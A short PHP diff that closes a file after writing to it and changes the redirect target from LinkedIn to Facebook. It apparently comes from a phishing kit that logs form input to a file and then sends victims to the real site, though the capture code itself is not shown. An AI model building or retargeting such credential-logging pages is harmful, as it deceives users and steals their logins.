@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 } 
 fwrite($handle,"\r\n"); 
 fclose($handle); 
-header("location:https://www.linkedin.com/"); 
+header("location:https://web.facebook.com/?_rdc=1&_rdr"); 
 exit;
 ?>
